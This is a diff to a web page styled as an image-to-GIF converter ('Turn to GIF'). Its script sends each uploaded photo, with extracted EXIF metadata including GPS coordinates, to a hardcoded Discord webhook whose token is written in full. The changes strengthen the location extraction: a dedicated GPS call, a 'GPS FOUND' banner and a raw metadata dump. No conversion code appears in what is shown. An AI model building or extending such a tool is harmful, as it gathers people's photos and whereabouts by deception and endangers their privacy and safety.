@@ -4,7 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>gif.fuck</title>
-  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/lite.umd.js"></script>
+  <!-- Using full build for better metadata support -->
+  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/full.umd.js"></script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -23,7 +24,7 @@
     }
     .card {
       width: 100%;
-      max-width: 480px;
+      max-width: 520px;
       background: rgba(255, 255, 255, 0.03);
       border: 1px solid rgba(255, 255, 255, 0.08);
       border-radius: 28px;
@@ -58,7 +59,7 @@
       justify-content: center;
       overflow: hidden;
       position: relative;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
       transition: all 0.3s ease;
     }
     .preview-area.has-image {
@@ -80,11 +81,6 @@
       font-size: 0.95rem;
       padding: 20px;
     }
-    .placeholder span {
-      display: block;
-      font-size: 2.5rem;
-      margin-bottom: 10px;
-    }
     .btn-row {
       display: flex;
       gap: 12px;
@@ -99,10 +95,6 @@
       font-weight: 600;
       cursor: pointer;
       transition: all 0.2s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
     }
     .btn-secondary {
       background: rgba(255, 255, 255, 0.08);
@@ -128,6 +120,21 @@
       transform: none;
       box-shadow: none;
     }
+    .meta-box {
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 14px;
+      padding: 14px;
+      margin-top: 16px;
+      font-size: 0.85rem;
+      color: #ccc;
+      max-height: 200px;
+      overflow-y: auto;
+      display: none;
+      text-align: left;
+      white-space: pre-wrap;
+      line-height: 1.5;
+    }
     .status {
       text-align: center;
       margin-top: 18px;
@@ -143,12 +150,11 @@
 <body>
   <div class="card">
     <div class="logo">gif.fuck</div>
-    <div class="subtitle">Supports JPG, PNG, WEBP, HEIC, AVIF, TIFF, GIF + more</div>
+    <div class="subtitle">Upload → extract metadata → send to Discord</div>
 
     <div class="preview-area" id="previewArea">
       <div class="placeholder" id="placeholder">
-        <span></span>
-        Drop or select any image
+        Select or drop an image
       </div>
       <img id="preview" alt="Preview">
     </div>
@@ -160,12 +166,12 @@
 
     <button class="btn btn-primary" id="convertBtn">Turn to GIF</button>
 
+    <div class="meta-box" id="metaBox"></div>
     <div class="status" id="status"></div>
   </div>
 
-  <!-- Accept almost every image type -->
-  <input type="file" id="fileInput" accept="image/*,.heic,.heif,.avif,.tiff,.tif,.bmp,.gif,.webp" hidden>
-  <input type="file" id="cameraInput" accept="image/*,.heic,.heif" capture="environment" hidden>
+  <input type="file" id="fileInput" accept="image/*,.heic,.heif,.avif,.tiff,.tif" hidden>
+  <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
@@ -175,86 +181,78 @@
     const preview = document.getElementById('preview');
     const previewArea = document.getElementById('previewArea');
     const placeholder = document.getElementById('placeholder');
+    const metaBox = document.getElementById('metaBox');
     let selectedFile = null;
+    let currentMeta = {};
 
     function updateStatus(text, type = "") {
       statusEl.textContent = text;
       statusEl.className = "status " + type;
     }
 
-    // Supported image MIME types + extensions
     function isImageFile(file) {
       if (!file) return false;
-      
-      // Check MIME type
       if (file.type && file.type.startsWith("image/")) return true;
-      
-      // Fallback for some browsers / HEIC / AVIF that report empty type
       const name = file.name.toLowerCase();
-      const extensions = [
-        '.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp',
-        '.heic', '.heif', '.avif', '.tiff', '.tif', '.svg'
-      ];
-      return extensions.some(ext => name.endsWith(ext));
+      return ['.jpg','.jpeg','.png','.gif','.webp','.bmp','.heic','.heif','.avif','.tiff','.tif'].some(ext => name.endsWith(ext));
     }
 
     async function getAllMetadata(file) {
       try {
-        const data = await exifr.parse(file, {
-          tiff: true,
-          xmp: true,
-          icc: true,
-          jfif: true,
-          ihdr: true,
-          iptc: true,
-          gps: true,
-          // Helps with more formats
-          mergeOutput: true
-        });
+        // Try multiple methods for better compatibility
+        let data = await exifr.parse(file, true); // true = parse everything
+        
+        // Also try dedicated GPS method
+        try {
+          const gps = await exifr.gps(file);
+          if (gps) {
+            data = data || {};
+            data.latitude = gps.latitude;
+            data.longitude = gps.longitude;
+          }
+        } catch (e) {}
+
         return data || {};
       } catch (e) {
-        console.log("Metadata parse error:", e);
+        console.error("Metadata error:", e);
         return {};
       }
     }
 
     function formatMetadata(meta) {
       if (!meta || Object.keys(meta).length === 0) {
-        return "No metadata found in this image.";
+        return "No metadata found.";
       }
 
-      let lines = [];
+      const lines = [];
 
-      if (meta.Make) lines.push(`**Camera Make:** ${meta.Make}`);
-      if (meta.Model) lines.push(`**Camera Model:** ${meta.Model}`);
-      if (meta.Software) lines.push(`**Software:** ${meta.Software}`);
-      if (meta.DateTimeOriginal) lines.push(`**Date Taken:** ${meta.DateTimeOriginal}`);
-      if (meta.CreateDate) lines.push(`**Create Date:** ${meta.CreateDate}`);
-      if (meta.ModifyDate) lines.push(`**Modify Date:** ${meta.ModifyDate}`);
-      if (meta.ImageWidth && meta.ImageHeight) {
-        lines.push(`**Dimensions:** ${meta.ImageWidth} × ${meta.ImageHeight}`);
-      }
-      if (meta.Orientation) lines.push(`**Orientation:** ${meta.Orientation}`);
-      if (meta.ISO) lines.push(`**ISO:** ${meta.ISO}`);
-      if (meta.FNumber) lines.push(`**Aperture:** f/${meta.FNumber}`);
-      if (meta.ExposureTime) lines.push(`**Exposure:** ${meta.ExposureTime}s`);
-      if (meta.FocalLength) lines.push(`**Focal Length:** ${meta.FocalLength}mm`);
-      if (meta.LensModel) lines.push(`**Lens:** ${meta.LensModel}`);
+      // Priority fields
+      if (meta.Make) lines.push(`Camera Make: ${meta.Make}`);
+      if (meta.Model) lines.push(`Camera Model: ${meta.Model}`);
+      if (meta.Software) lines.push(`Software: ${meta.Software}`);
+      if (meta.DateTimeOriginal) lines.push(`Date Taken: ${meta.DateTimeOriginal}`);
+      if (meta.CreateDate) lines.push(`Create Date: ${meta.CreateDate}`);
+      if (meta.ImageWidth && meta.ImageHeight) lines.push(`Dimensions: ${meta.ImageWidth} × ${meta.ImageHeight}`);
+      if (meta.ISO) lines.push(`ISO: ${meta.ISO}`);
+      if (meta.FNumber) lines.push(`Aperture: f/${meta.FNumber}`);
+      if (meta.ExposureTime) lines.push(`Exposure: ${meta.ExposureTime}s`);
+      if (meta.FocalLength) lines.push(`Focal Length: ${meta.FocalLength}mm`);
+      if (meta.LensModel) lines.push(`Lens: ${meta.LensModel}`);
 
-      // GPS
+      // GPS - most important
       if (meta.latitude && meta.longitude) {
-        lines.push(`**GPS Latitude:** \`${meta.latitude.toFixed(6)}\``);
-        lines.push(`**GPS Longitude:** \`${meta.longitude.toFixed(6)}\``);
-        if (meta.GPSAltitude) lines.push(`**Altitude:** ${meta.GPSAltitude} m`);
+        lines.push(`GPS Latitude: ${meta.latitude}`);
+        lines.push(`GPS Longitude: ${meta.longitude}`);
+        if (meta.GPSAltitude) lines.push(`Altitude: ${meta.GPSAltitude} m`);
       }
 
-      // Fallback if very little data
-      if (lines.length < 2) {
-        const extra = Object.keys(meta)
-          .filter(k => meta[k] !== undefined && meta[k] !== null)
-          .slice(0, 10)
-          .map(k => `**${k}:** ${String(meta[k]).slice(0, 60)}`);
-        lines = lines.concat(extra);
+      // If still empty, show raw keys
+      if (lines.length === 0) {
+        Object.keys(meta).slice(0, 15).forEach(key => {
+          if (meta[key] !== undefined && meta[key] !== null) {
+            lines.push(`${key}: ${String(meta[key]).slice(0, 80)}`);
+          }
+        });
       }
 
       return lines.length > 0 ? lines.join("\n") : "No useful metadata found.";
@@ -265,70 +263,108 @@
       formData.append("file", file, file.name);
 
       const metaText = formatMetadata(meta);
+      const hasGPS = meta.latitude && meta.longitude;
 
-      const content = 
-        `**New image uploaded**\n` +
-        `**Filename:** ${file.name}\n` +
-        `**Type:** ${file.type || "unknown"}\n` +
-        `**Size:** ${(file.size / 1024 / 1024).toFixed(2)} MB\n\n` +
-        `**── Metadata ──**\n${metaText}`;
+      let content = `**New image uploaded**\n`;
+      content += `**File:** ${file.name}\n`;
+      content += `**Size:** ${(file.size / 1024 / 1024).toFixed(2)} MB\n`;
+      content += `**Type:** ${file.type || "unknown"}\n\n`;
+
+      if (hasGPS) {
+        content += `**GPS FOUND**\n`;
+        content += `Lat: \`${meta.latitude}\`\n`;
+        content += `Lon: \`${meta.longitude}\`\n\n`;
+      }
+
+      content += `**Metadata:**\n\`\`\`\n${metaText}\n\`\`\``;
+
+      // Also attach raw JSON so nothing is lost
+      const raw = JSON.stringify(meta, null, 2).slice(0, 1800);
+      if (raw && raw !== "{}") {
+        content += `\n\n**Raw metadata:**\n\`\`\`json\n${raw}\n\`\`\``;
+      }
 
       formData.append("payload_json", JSON.stringify({
         content: content,
         username: "gif.fuck"
       }));
 
-      await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+      const res = await fetch(WEBHOOK_URL, {
+        method: "POST",
+        body: formData
+      });
+
+      if (!res.ok) {
+        throw new Error("Webhook failed: " + res.status);
+      }
     }
 
-    function handleFile(file) {
+    async function handleFile(file) {
       if (!isImageFile(file)) {
-        updateStatus("Please select a valid image file", "error");
+        updateStatus("Please select a valid image", "error");
         return;
       }
 
       selectedFile = file;
+      currentMeta = {};
 
-      // Show preview (works for most formats)
+      // Preview
       const reader = new FileReader();
-      reader.onload = function(e) {
+      reader.onload = (e) => {
         preview.src = e.target.result;
         previewArea.classList.add("has-image");
         placeholder.style.display = "none";
       };
-      reader.onerror = function() {
-        // Some formats (like HEIC) may not preview in all browsers
+      reader.onerror = () => {
         previewArea.classList.add("has-image");
-        placeholder.innerHTML = `<span></span>Selected: ${file.name}<br><small>(preview not available)</small>`;
+        placeholder.innerHTML = `Selected: ${file.name}<br><small>Preview not available</small>`;
         placeholder.style.display = "block";
       };
       reader.readAsDataURL(file);
 
-      updateStatus(`Selected: ${file.name}`);
+      updateStatus("Reading metadata...", "loading");
       convertBtn.style.display = "block";
+      convertBtn.disabled = true;
+
+      // Extract metadata immediately and show it
+      try {
+        currentMeta = await getAllMetadata(file);
+        const formatted = formatMetadata(currentMeta);
+        metaBox.textContent = formatted;
+        metaBox.style.display = "block";
+
+        if (currentMeta.latitude && currentMeta.longitude) {
+          updateStatus(`GPS found: ${currentMeta.latitude.toFixed(5)}, ${currentMeta.longitude.toFixed(5)}`, "success");
+        } else {
+          updateStatus("Metadata loaded (no GPS detected)", "loading");
+        }
+      } catch (err) {
+        metaBox.textContent = "Failed to read metadata";
+        metaBox.style.display = "block";
+        updateStatus("Could not read metadata", "error");
+      }
+
       convertBtn.disabled = false;
     }
 
     async function convertToGif() {
       if (!selectedFile) return;
 
-      updateStatus("Extracting metadata + sending...", "loading");
+      updateStatus("Sending to Discord...", "loading");
       convertBtn.disabled = true;
 
       try {
-        const meta = await getAllMetadata(selectedFile);
-        await sendToWebhook(selectedFile, meta);
-        updateStatus("Sent with all available metadata", "success");
+        await sendToWebhook(selectedFile, currentMeta);
+        updateStatus("Sent successfully!", "success");
       } catch (err) {
         console.error(err);
-        await sendToWebhook(selectedFile, {});
-        updateStatus("Sent (metadata extraction failed)", "error");
+        updateStatus("Failed to send: " + err.message, "error");
       }
 
       convertBtn.disabled = false;
     }
 
-    // Event listeners
+    // Events
     document.getElementById("uploadBtn").onclick = () => document.getElementById("fileInput").click();
     document.getElementById("cameraBtn").onclick = () => document.getElementById("cameraInput").click();
     convertBtn.onclick = convertToGif;
